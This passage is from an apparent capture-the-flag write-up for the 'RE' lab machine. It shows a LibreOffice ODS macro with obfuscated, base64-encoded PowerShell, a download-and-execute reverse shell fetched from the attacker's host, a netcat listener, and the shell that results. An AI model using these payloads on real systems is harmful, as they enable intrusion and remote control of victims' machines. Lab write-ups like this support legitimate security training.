from our VPN interface 10.10.14.73 towards our docker-machine hosting ip address</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ssh username@127.0.0.1 -L 10.10.14.73:8080:192.168.XXX.XXX:8080 10.10.14.73:8000:192.168.XXX.XXX:8000
</span></span><span style=display:flex><span>netstat -aln | grep <span style=color:#bd93f9>8080</span>
</span></span><span style=display:flex><span>tcp4       <span style=color:#bd93f9>0</span>      <span style=color:#bd93f9>0</span>  10.10.14.73.8080       *.*                    LISTEN
</span></span></code></pre></div><p>traffic from VPN is now redirected to our attacking machine</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>msf5 &gt; use exploit/windows/misc/hta_server
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#ff79c6>(</span>windows/misc/hta_server<span style=color:#ff79c6>)</span> &gt; run
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Exploit running as background job 0.
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Exploit completed, but no session was created.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Started reverse TCP handler on 172.17.0.3:4444
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#ff79c6>(</span>windows/misc/hta_server<span style=color:#ff79c6>)</span> &gt; <span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Using URL: http://0.0.0.0:8080/z8ztbA5.hta
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Local IP: http://172.17.0.3:8080/z8ztbA5.hta
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Server started.:
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#ff79c6>(</span>windows/misc/hta_server<span style=color:#ff79c6>)</span> &gt; ss -lntp | grep <span style=color:#bd93f9>8080</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> exec: ss -lntp | grep <span style=color:#bd93f9>80</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>LISTEN   <span style=color:#bd93f9>0</span>         <span style=color:#bd93f9>0</span>                 127.0.0.1:8080             0.0.0.0:*        users:<span style=color:#ff79c6>((</span><span style=color:#f1fa8c>&#34;ruby&#34;</span>,pid<span style=color:#ff79c6>=</span>333,fd<span style=color:#ff79c6>=</span>13<span style=color:#ff79c6>))</span>
</span></span><span style=display:flex><span>LISTEN   <span style=color:#bd93f9>0</span>         <span style=color:#bd93f9>0</span>                   0.0.0.0:8000             0.0.0.0:*        users:<span style=color:#ff79c6>((</span><span style=color:#f1fa8c>&#34;ruby&#34;</span>,pid<span style=color:#ff79c6>=</span>333,fd<span style=color:#ff79c6>=</span>7<span style=color:#ff79c6>))</span>
</span></span></code></pre></div><p>Sending the malicious odt file was not successful as we did not get a shell in return, so we edit the file with a simpler macro that simply ping our machine <code>Shell("ping -n 1 10.10.14.73")</code>. On our host, we starts <code>tcpdump -i utun4 icmp</code> to capture ICMP protocol. Unfortunately we are not succesful. Referring at the reblog.htb website blog posts, we should try instead *.ods file. Not being able to generate such file with metasploit, I download libreoffice and generate a macro in a ping.ods file customized to load the macro module when the document is Loaded.
Indeed, after <code>smb: \> put ping.ods</code> we can see our ICMP traffic:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>% sudo tcpdump -i utun4 icmp
</span></span><span style=display:flex><span>13:58:00.705685 IP reblog.htb &gt; 10.10.14.73: ICMP <span style=color:#8be9fd;font-style:italic>echo</span> request, id 1, seq 1, length <span style=color:#bd93f9>40</span>
</span></span><span style=display:flex><span>13:58:00.705746 IP 10.10.14.73 &gt; reblog.htb: ICMP <span style=color:#8be9fd;font-style:italic>echo</span> reply, id 1, seq 1, length <span style=color:#bd93f9>40</span>
</span></span></code></pre></div><p>Further obfuscation of the powershell command</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ctf@6274ae97a895:/$ <span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#34;ping -n 1 10.10.14.73&#34;</span> | xxd
</span></span><span style=display:flex><span>00000000: <span style=color:#bd93f9>7069</span> 6e67 202d 6e20 <span style=color:#bd93f9>3120</span> <span style=color:#bd93f9>3130</span> 2e31 302e  ping -n <span style=color:#bd93f9>1</span> 10.10.
</span></span><span style=display:flex><span>00000010: <span style=color:#bd93f9>3134</span> 2e37 330a                           14.73.
</span></span><span style=display:flex><span>ctf@6274ae97a895:/$ <span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#34;ping -n 1 10.10.14.73&#34;</span> | iconv -t utf-16le | xxd
</span></span><span style=display:flex><span>00000000: <span style=color:#bd93f9>7000</span> <span style=color:#bd93f9>6900</span> 6e00 <span style=color:#bd93f9>6700</span> <span style=color:#bd93f9>2000</span> 2d00 6e00 <span style=color:#bd93f9>2000</span>  p.i.n.g. .-.n. .
</span></span><span style=display:flex><span>00000010: <span style=color:#bd93f9>3100</span> <span style=color:#bd93f9>2000</span> <span style=color:#bd93f9>3100</span> <span style=color:#bd93f9>3000</span> 2e00 <span style=color:#bd93f9>3100</span> <span style=color:#bd93f9>3000</span> 2e00  1. .1.0...1.0...
</span></span><span style=display:flex><span>00000020: <span style=color:#bd93f9>3100</span> <span style=color:#bd93f9>3400</span> 2e00 <span style=color:#bd93f9>3700</span> <span style=color:#bd93f9>3300</span> 0a00            1.4...7.3...
</span></span><span style=display:flex><span>ctf@6274ae97a895:/$ <span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#34;ping -n 1 10.10.14.73&#34;</span> | iconv -t utf-16le | base64 -w <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgA3ADMACgA</span><span style=color:#ff79c6>=</span>
</span></span></code></pre></div><p>We are succesful with the following macro. We can now simply replace variable h with any Base64 Encoded Powershell command</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>REM  *****  BASIC  *****
</span></span><span style=display:flex><span>Sub Main
</span></span><span style=display:flex><span>	<span style=color:#8be9fd;font-style:italic>a</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;cm&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#8be9fd;font-style:italic>b</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;d /&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#8be9fd;font-style:italic>c</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;c po&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#8be9fd;font-style:italic>d</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;wershe&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#8be9fd;font-style:italic>e</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;ll -enco&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#8be9fd;font-style:italic>f</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;dedcom&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#8be9fd;font-style:italic>g</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;mand &#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#8be9fd;font-style:italic>h</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgA3ADMACgA=&#34;</span>
</span></span><span style=display:flex><span>	Shell<span style=color:#ff79c6>(</span>a + b + c + d + e + f + g + h<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>End Sub
</span></span></code></pre></div><p>We want to build a more elaborated payload that will download and execute a powershell TCP Reverse Shell script from github.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ctf@6274ae97a895:~$ git clone https://github.com/samratashok/nishang
</span></span><span style=display:flex><span>ctf@6274ae97a895:~$ <span style=color:#8be9fd;font-style:italic>cd</span> nishang/
</span></span><span style=display:flex><span>ctf@6274ae97a895:~/nishang$ <span style=color:#8be9fd;font-style:italic>cd</span> Shells/
</span></span><span style=display:flex><span>ctf@6274ae97a895:~/nishang/Shells$ cp Invoke-PowerShellTcp.ps1 ~/htb/http/shell.ps1
</span></span></code></pre></div><p>Our macro should execute the following command, however we want it encoded in base64</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Shell(<span style=color:#f1fa8c>&#34;cmd /c powershell &#34;&#34;iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.73:8080/shell.ps1&#39;)&#34;&#34;&#34;</span>)
</span></span></code></pre></div><p>To achieve this, we generate a new EncodedCommand to replace the base64 string above/</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ctf@6274ae97a895:~/htb$ <span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#34;&#34;</span>iex<span style=color:#f1fa8c>\(</span>new-object net.webclient<span style=color:#f1fa8c>\)</span>.downloadstring<span style=color:#f1fa8c>\(\&#39;</span>http://10.10.14.73:8080/shell.ps1<span style=color:#f1fa8c>\&#39;\)</span><span style=color:#f1fa8c>&#34;&#34;</span> | iconv -t utf-16le | base64 -w <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADcAMwA6ADgAMAA4ADAALwBzAGgAZQBsAGwALgBwAHMAMQAnACkACgA</span><span style=color:#ff79c6>=</span>
</span></span></code></pre></div><p>Once we submit the modified file, we observe the TCP reverse Shell is successfully uploaded on the victim</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ctf@6274ae97a895:~/htb/http$ python3 -m http.server <span style=color:#bd93f9>8080</span>
</span></span><span style=display:flex><span>Serving HTTP on 0.0.0.0 port <span style=color:#bd93f9>8080</span> <span style=color:#ff79c6>(</span>http://0.0.0.0:8080/<span style=color:#ff79c6>)</span> ...
</span></span><span style=display:flex><span>192.168.99.1 - - <span style=color:#ff79c6>[</span>15/Feb/2020 09:29:14<span style=color:#ff79c6>]</span> <span style=color:#f1fa8c>&#34;GET /shell.ps1 HTTP/1.1&#34;</span> <span style=color:#bd93f9>200</span> -
</span></span></code></pre></div><p>and almost immediately we have our reverse tcp shell</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ctf@6274ae97a895:~$ rlwrap nc -lnvp <span style=color:#bd93f9>8000</span>
</span></span><span style=display:flex><span>listening on <span style=color:#ff79c6>[</span>any<span style=color:#ff79c6>]</span> <span style=color:#bd93f9>8000</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#ff79c6>[</span>172.17.0.2<span style=color:#ff79c6>]</span> from <span style=color:#ff79c6>(</span>UNKNOWN<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>[</span>192.168.99.1<span style=color:#ff79c6>]</span> <span style=color:#bd93f9>63663</span>
</span></span><span style=display:flex><span>Windows PowerShell running as user luke on RE
</span></span><span style=display:flex><span>Copyright <span style=color:#ff79c6>(</span>C<span style=color:#ff79c6>)</span> <span style=color:#bd93f9>2015</span> Microsoft Corporation. All rights reserved.
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\P</span>rogram Files<span style=color:#f1fa8c>\L</span>ibreOffice<span style=color:#f1fa8c>\p</span>rogram&gt;re<span style=color:#f1fa8c>\l</span>uke
</span></span><span style=display:flex><span>    Directory: C:<span style=color:#f1fa8c>\P</span>rogram Files<span style=color:#f1fa8c>\L</span>ibreOffice<span style=color:#f1fa8c>\p</span>rogram
</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name
</span></span><span style=display:flex><span>----                -------------         ------ ----
</span></span><span style=display:flex><span>d-----        3/13/2019   6:47 PM                classes
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\P</span>rogram Files<span style=color:#f1fa8c>\L</span>ibreOffice<span style=color:#f1fa8c>\p</span>rogram&gt; whoami
</span></span><span style=display:flex><span>re<span style=color:#f1fa8c>\l</span>uke
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\U</span>sers<span style=color:#f1fa8c>\l</span>uke<span style=color:#f1fa8c>\D</span>esktop&gt; <span style=color:#8be9fd;font-style:italic>type</span> user.txt
</span></span></code></pre></div><p>We get the user flag from the Desktop folder, then Looking at luke Document folder,
we can find the folder where ods file are processed, as well yara rules and a powershell script.
We use icalcs to check the powershell script belongs to Luke.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\U</span>sers<span style=color:#f1fa8c>\l</span>uke<span style=color:#f1fa8c>\D</span>ocuments&gt; dir
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Directory: C:<span style=color:#f1fa8c>\U</span>sers<span style=color:#f1fa8c>\l</span>uke<span style=color:#f1fa8c>\D</span>ocuments
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name
</span></span><span style=display:flex><span>----                -------------         ------ ----
</span></span><span style=display:flex><span>d-----        2/15/2020   2:28 AM                malware_dropbox
</span></span><span style=display:flex><span>d-----        2/15/2020   2:29 AM                malware_process
</span></span><span style=display:flex><span>d-----        2/15/2020   2:29 AM                ods
</span></span><span style=display:flex><span>-a----        6/18/2019  10:30 PM           <span style=color:#bd93f9>1096</span> ods.yara
</span></span><span style=display:flex><span>-a----        6/18/2019  10:33 PM           <span style=color:#bd93f9>1783</span> process_samples.ps1
</span></span><span style=display:flex><span>-a----        3/13/2019   6:47 PM        <span style=color:#bd93f9>1485312</span> yara64.exe
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\U</span>sers<span style=color:#f1fa8c>\l</span>uke<span style=color:#f1fa8c>\D</span>ocuments&gt; icacls process_samples.ps1
</span></span><span style=display:flex><span>process_samples.ps1 NT AUTHORITY<span style=color:#f1fa8c>\S</span>YSTEM:<span style=color:#ff79c6>(</span>I<span style=color:#ff79c6>)(</span>F<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>                    BUILTIN<span style=color:#f1fa8c>\A</span>dministrators:<span style=color:#ff79c6>(</span>I<span style=color:#ff79c6>)(</span>F<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>                    RE<span style=color:#f1fa8c>\l</span>uke:<span style=color:#ff79c6>(</span>I<span style=color:#ff79c6>)(</span>F<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>                    RE<span style=color:#f1fa8c>\c</span>oby:<span style=color:#ff79c6>(</span>I<span style=color:#ff79c6>)(</span>F<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Successfully processed <span style=color:#bd93f9>1</span> files; Failed processing <span style=color:#bd93f9>0</span> files
</span></span></code></pre></div><p>Let&rsquo;s explore how the malware analysis automation works:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>PS </span>C:\Users\luke\Desktop&gt; <span style=color:#8be9fd;font-style:italic>cd </span>../Documents
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>PS </span>C:\Users\luke\Documents&gt; <span style=color:#8be9fd;font-style:italic>type </span>process_samples.ps1
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$process_dir</span> = <span style=color:#f1fa8c>&#34;C:\Users\luke\Documents\malware_process&#34;</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$files_to_analyze</span> = <span style=color:#f1fa8c>&#34;C:\Users\luke\Documents\ods&#34;</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$yara</span> = <span style=color:#f1fa8c>&#34;C:\Users\luke\Documents\yara64.exe&#34;</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$rule</span> = <span style=color:#f1fa8c>&#34;C:\Users\luke\Documents\ods.yara&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>while</span>($true) {
</span></span><span style=display:flex><span>        <span style=color:#6272a4># Get new samples</span>
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>move </span>C:\Users\luke\Documents\malware_dropbox\* <span style=color:#8be9fd;font-style:italic>$process_dir</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#6272a4># copy each ods to zip file</span>
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>Get-ChildItem</span> <span style=color:#8be9fd;font-style:italic>$process_dir</span> -Filter *.ods |
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>Copy-Item</span> -Destination {<span style=color:#8be9fd;font-style:italic>$_</span>.fullname <span style=color:#ff79c6>-replace</span> <span style=color:#f1fa8c>&#34;.ods&#34;</span>, <span style=color:#f1fa8c>&#34;.zip&#34;</span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>Get-ChildItem</span> <span style=color:#8be9fd;font-style:italic>$process_dir</span> -Filter *.zip | <span style=color:#8be9fd;font-style:italic>ForEach-Object</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#6272a4># unzip archive to get access to content</span>
</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>$unzipdir</span> = <span style=color:#8be9fd;font-style:italic>Join-Path</span> <span style=color:#8be9fd;font-style:italic>$_</span>.directory <span style=color:#8be9fd;font-style:italic>$_</span>.Basename
</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>New-Item</span> -Force -ItemType directory -Path <span style=color:#8be9fd;font-style:italic>$unzipdir</span> | <span style=color:#8be9fd;font-style:italic>Out-Null</span>
</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>Expand-Archive</span> <span style=color:#8be9fd;font-style:italic>$_</span>.fullname -Force -ErrorAction SilentlyContinue -DestinationPath <span style=color:#8be9fd;font-style:italic>$unzipdir</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#6272a4># yara to look for known malware</span>
</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>$yara_out</span> = &amp; <span style=color:#8be9fd;font-style:italic>$yara</span> -r <span style=color:#8be9fd;font-style:italic>$rule</span> <span style=color:#8be9fd;font-style:italic>$unzipdir</span>
</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>$ods_name</span> = <span style=color:#8be9fd;font-style:italic>$_</span>.fullname <span style=color:#ff79c6>-replace</span> <span style=color:#f1fa8c>&#34;.zip&#34;</span>, <span style=color:#f1fa8c>&#34;.ods&#34;</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> (<span style=color:#8be9fd;font-style:italic>$yara_out</span>.length <span style=color:#ff79c6>-gt</span> <span style=color:#bd93f9>0</span>) {
</span></span><span style=display:flex><span>                        <span style=color:#8be9fd;font-style:italic>Remove-Item</span> <span style=color:#8be9fd;font-style:italic>$ods_name</span>
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#6272a4># if any ods files left, make sure they launch, and then archive:</span>
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>$files</span> = <span style=color:#8be9fd;font-style:italic>ls </span><span style=color:#8be9fd;font-style:italic>$process_dir</span>\*.ods
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> ( <span style=color:#8be9fd;font-style:italic>$files</span>.length <span style=color:#ff79c6>-gt</span> <span style=color:#bd93f9>0</span>) {
</span></span><span style=display:flex><span>                <span style=color:#6272a4># launch ods files</span>
</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>Invoke-Item</span> <span style=color:#f1fa8c>&#34;C:\Users\luke\Documents\malware_process\*.ods&#34;</span>
</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>Start-Sleep</span> -s <span style=color:#bd93f9>5</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#6272a4># kill open office, sleep</span>
</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>Stop-Process</span> -Name soffice*
</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>Start-Sleep</span> -s <span style=color:#bd93f9>5</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#6272a4>#&amp; &#39;C:\Program Files (x86)\WinRAR\Rar.exe&#39; a -ep $process_dir\temp.rar $process_dir\*.ods 2&gt;&amp;1 | Out-Null</span>
</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>Compress-Archive</span> -Path <span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$process_dir</span><span style=color:#f1fa8c>\*.ods&#34;</span> -DestinationPath <span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$process_dir</span><span style=color:#f1fa8c>\temp.zip&#34;</span>
</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>$hash</span> = (<span style=color:#8be9fd;font-style:italic>Get-FileHash</span> -Algorithm MD5 <span style=color:#8be9fd;font-style:italic>$process_dir</span>\temp.zip).hash
</span></span><span style=display:flex><span>                <span style=color:#6272a4># Upstream processing may expect rars. Rename to .rar</span>
</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>Move-Item</span> -Force -Path <span style=color:#8be9fd;font-style:italic>$process_dir</span>\temp.zip -Destination <span style=color:#8be9fd;font-style:italic>$files_to_analyze</span>\<span style=color:#8be9fd;font-style:italic>$hash</span>.rar
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>Remove-Item</span> -Recurse -force -Path <span style=color:#8be9fd;font-style:italic>$process_dir</span>\*
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>Start-Sleep</span> -s <span style=color:#bd93f9>5</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Installation of Searchsploit</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sudo git clone https://github.com/offensive-security/exploitdb.git /opt/exploitdb
</span></span><span style=display:flex><span>sed <span style=color:#f1fa8c>&#39;s|path_array+=(.*)|path_array+=(&#34;/opt/exploitdb&#34;)|g&#39;</span> /opt/exploitdb/.searchsploit_rc &gt; ~/.searchsploit_rc
</span></span><span style=display:flex><span>sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit
</span></span><span style=display:flex><span><span style=color:#6272a4>#For MacOsX, simply --&gt; brew update &amp;&amp; brew install exploitdb</span>
</span></span></code></pre></div><p>We try to access the web root folder, but No access inside those 3 folders.
We add 3 virtual hosts (blog|ip|re).htb in our /etc/hosts but there is no site available yet.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>PS </span>C:\Users\luke\Documents&gt; <span style=color:#8be9fd;font-style:italic>dir </span><span style=color:#f1fa8c>&#34;C:/inetpub/wwwroot/&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Directory: C:\inetpub\wwwroot
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name
</span></span><span style=display:flex><span>----                -------------         ------ ----
</span></span><span style=display:flex><span>d-----        <span style=color:#bd93f9>3</span>/<span style=color:#bd93f9>26</span>/<span style=color:#bd93f9>2019</span>   <span style=color:#bd93f9>5</span>:<span style=color:#bd93f9>58</span> PM                blog
</span></span><span style=display:flex><span>d-----        <span style=color:#bd93f9>3</span>/<span style=color:#bd93f9>27</span>/<span style=color:#bd93f9>2019</span>   <span style=color:#bd93f9>2</span>:<span style=color:#bd93f9>10</span> PM                ip
</span></span><span style=display:flex><span>d-----        <span style=color:#bd93f9>6</span>/<span style=color:#bd93f9>18</span>/<span style=color:#bd93f9>2019</span>  <span style=color:#bd93f9>10</span>:<span style=color:#bd93f9>18</span> PM                re
</span></span></code></pre></div><p>Looking at <a href=http://re.htb>http://re.htb</a> html source code, we have hint on Ghidra:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#ff79c6>&lt;!DOCTYPE html&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#ff79c6>html</span>&gt;
</span></span><span style=display:flex><span>  &lt;<span style=color:#ff79c6>head</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#ff79c6>title</span>&gt;Ghidra Dropbox Coming Soon!&lt;/<span style=color:#ff79c6>title</span>&gt;
</span></span><span style=display:flex><span>  &lt;/<span style=color:#ff79c6>head</span>&gt;
</span></span><span style=display:flex><span>  &lt;<span style=color:#ff79c6>body</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#ff79c6>p</span>&gt;Please check back soon for re.htb updates.&lt;/<span style=color:#ff79c6>p</span>&gt;
</span></span><span style=display:flex><span>    <span style=color:#6272a4>&lt;!--future capability
</span></span></span><span style=display:flex><span><span style=color:#6272a4>	&lt;p&gt; To upload Ghidra project:
</span></span></span><span style=display:flex><span><span style=color:#6272a4>	&lt;ol&gt;
</span></span></span><span style=display:flex><span><span style=color:#6272a4>	  &lt;li&gt; exe should be at project root.Directory stucture should look something like:
</span></span></span><span style=display:flex><span><span style=color:#6272a4>	      &lt;code&gt;&lt;pre&gt;
</span></span></span><span style=display:flex><span><span style=color:#6272a4>|   vulnerserver.gpr
</span></span></span><span style=display:flex><span><span style=color:#6272a4>|   vulnserver.exe
</span></span></span><span style=display:flex><span><span style=color:#6272a4>\---vulnerserver.rep
</span></span></span><span style=display:flex><span><span style=color:#6272a4>    |   project.prp
</span></span></span><span style=display:flex><span><span style=color:#6272a4>    |   projectState
</span></span></span><span style=display:flex><span><span style=color:#6272a4>    |
</span></span></span><span style=display:flex><span><span style=color:#6272a4>    +---idata
</span></span></span><span style=display:flex><span><span style=color:#6272a4>    |   |   ~index.bak
</span></span></span><span style=display:flex><span><span style=color:#6272a4>    |   |   ~index.dat
</span></span></span><span style=display:flex><span><span style=color:#6272a4>    |   |
</span></span></span><span style=display:flex><span><span style=color:#6272a4>    |   \---00
</span></span></span><span style=display:flex><span><span style=color:#6272a4>    |       |   00000000.prp
</span></span></span><span style=display:flex><span><span style=color:#6272a4>    |       |
</span></span></span><span style=display:flex><span><span style=color:#6272a4>    |       \---~00000000.db
</span></span></span><span style=display:flex><span><span style=color:#6272a4>    |               db.2.gbf
</span></span></span><span style=display:flex><span><span style=color:#6272a4>    |               db.3.gbf
</span></span></span><span style=display:flex><span><span style=color:#6272a4>    |
</span></span></span><span style=display:flex><span><span style=color:#6272a4>    +---user
</span></span></span><span style=display:flex><span><span style=color:#6272a4>    |       ~index.dat
</span></span></span><span style=display:flex><span><span style=color:#6272a4>    |
</span></span></span><span style=display:flex><span><span style=color:#6272a4>    \---versioned
</span></span></span><span style=display:flex><span><span style=color:#6272a4>            ~index.bak
</span></span></span><span style=display:flex><span><span style=color:#6272a4>            ~index.dat
</span></span></span><span style=display:flex><span><span style=color:#6272a4>		  &lt;/pre&gt;&lt;/code&gt;
</span></span></span><span style=display:flex><span><span style=color:#6272a4>	  &lt;/li&gt;
</span></span></span><span style=display:flex><span><span style=color:#6272a4>	  &lt;li&gt;Add entire directory into zip archive.&lt;/li&gt;
